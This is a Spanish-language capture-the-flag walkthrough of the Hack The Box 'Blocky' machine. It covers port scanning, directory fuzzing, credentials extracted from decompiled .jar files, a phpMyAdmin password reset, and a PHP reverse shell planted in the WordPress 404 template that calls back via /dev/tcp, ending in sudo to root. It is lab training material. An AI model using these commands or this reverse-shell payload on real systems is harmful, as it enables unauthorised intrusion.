---
layout: post
title: HTB_Blocky
date: 2023/07/10
slug: HTB_Blocky
heroImage: /assets/machines.jpg
---

# Blocky {-}

## Introduccion {-}

La maquina del dia 30/07/2021 se llama Blocky
.

El replay del live se puede ver aqui

[![S4vitaar Blocky maquina](https://img.youtube.com/vi/LPh8BTqEx2c/0.jpg)](https://www.youtube.com/watch?v=LPh8BTqEx2c)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.37
```
ttl: 63 -> maquina linux. 
Recuerda que en cuanto a ttl se trata, 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.37 
```

si consideras que va muy lento el escaneo puedes poner los siguientes parametros para que valla mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted
```

| Puerto | Servicio  | Que se nos occure?                        | Que falta?           |
| ------ | --------- | ----------------------------------------- | -------------------- |
| 21     | ftp       | conectar como anonymous                   |                      |
| 22     | ssh       | conexion directa                          | usuario y contraseña |
| 80     | http      | Analisis de la web y Fuzzing              |                      |
| 25565  | minecraft | con el puerto 53 pensamos en virt hosting |                      |


### Conectar al ftp como anonymous {-}

```bash
ftp 10.10.10.37
Name: anonymous
password: <enter>
#Output
530 Login incorrect.
```

No nos deja entrar como anonymous

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.37
```

Aqui vemos que estamos en un Wordpress

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.37 -oN webScan
```

Ya nos detecta un 
```bash
 /phpmyadmin/ 
```
 y ficheros de wordpress

#### Chequear la web del puerto 80 {-}

Con firefox navegamos en la web para ver lo que es.

- wappalizer nos dice que es Wordpress
- Vemos que la web esta under construction
- Si pinchamos el post vemos que es el usuario NOTCH que lo a echo

Como es un wordpress intentamos ir al 
```bash
 http://10.10.10.37/wp-login.php 
```
 y miramos si hay el usuario NOTCH. 
Efectivamente el usuario NOTCH existe. 

Vamos a por el 
```bash
 http://10.10.10.37/phpmyadmin/ 
```
 y buscamos previamente en google si encontramos credenciales por
defecto pero no funcionan.

Tenemos que ir buscando mas rutas.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.37/WFUZZ
```

Encontramos un ruta plugins que no suele ser normal porque en wordpress los plugins suelen estar en 
```bash
 /wp-content/plugins 
```
 y no
en 
```bash
 /plugins 
```
 directamente

Aqui encontramos dos ficheros 
```bash
 .jar 
```
. Los descargamos en nuestra maquina de atacante.




## Evaluacion de vulnerabilidades {-}

### Analizamos los ficheros {-}

Los ficheros 
```bash
 .jar 
```
 son ficheros comprimidos que se pueden descomprimir con la herramienta 
```bash
 unzip 
```


```bash
unzip BlockyCore.jar
unzip griefprevention-1.11.2-3.1.1.298.jar
```

Ya tenemos ficheros 
```bash
 .class 
```
 que podemos analizar con **strings** o mejor con **javap**

```bash
javap -c Blockycore.class
```

Aqui ya podemos ver cosas como un usuario root y una contraseña para un sqlUser.

Aqui vamos a la url 
```bash
 http://10.10.10.37/phpmyadmin/ 
```
 y probamos. Ya podemos entrar en el panel de configuracion
de la base de datos.

Vemos la base de datos de wordpress y le cambiamos la contraseña al usuario NOTCH. Lo unico seria seleccionnar la Funcion
MD5 al lado de la contraseña.


![hmyadmi-otch](/assets/images/phpmyadmin-notch.png) 
Intentamos conectar al wordpress con el usuario NOTCH y su nueva contraseña y pa dentro.


### Editar el 404 Template de Wordpress {-}

Cada vez que se puede entrar en el panel de administracion de wordpress siempre hacemos lo mismo.

Pinchamos en 
```bash
 Appearance > Editor 
```
 y retocamos el fichero 404 Template.

> [ ! ] Nota: Si este fichero no existe, justo encima, se puede **Select theme to edit** y buscar otro tema.

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la 404 Template {-}

Nos ponemos en escucha con el puerto 443.

```bash
nc -nlvp 443
```

Editamos el fichero 404 Template con una reverse shell en php

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'");
?>
```

ya podemos ir al url 
```bash
 http://10.10.10.37/?p=404.php 
```
 y pa dentro

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting al usuario notch {-}

Miramos si hay reutilisacion de contraseñas 

```bash
su notch 
```

Y con la contraseña encontrada en el ficher 
```bash
 BlockyCore.class 
```
 funciona. Y ya podemos ver la flag.## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
sudo -l
#Output
(ALL : ALL) ALL
```

Vemos que el usuario notch puede efectuar cualquier comando como qualquier usuario ;)

```bash
sudo su
whoami

root
```

Ya esta ;)
